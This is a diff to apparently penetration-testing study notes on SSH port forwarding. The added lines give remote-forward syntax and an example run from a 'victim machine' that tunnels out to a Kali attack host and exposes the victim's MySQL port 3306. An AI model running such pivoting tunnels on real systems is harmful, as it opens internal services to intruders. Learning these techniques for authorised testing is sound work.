@@ -2314,6 +2314,9 @@ Client, Web and Password Attacks
     an internal non routable network
 
     -   `ssh <gateway> -R <remote port to bind>:<local host>:<local port>` 
+    -   `ssh -N -R [bind_address:]port:host:hostport [username@address]
+    -   e.g ssh -N -R 10.11.10.4:2221:127.0.0.1:3306 kali@10.11.0.4
+    -  ssh out to attack machine from victim machine that will open a listener on port 2221 on attack machine and forward to victim machine 3306
 
 -   SSH Dynamic Port Forwarding: create a SOCKS4 proxy on our local
     attacking box to tunnel ALL incoming traffic to ANY host in the DMZ
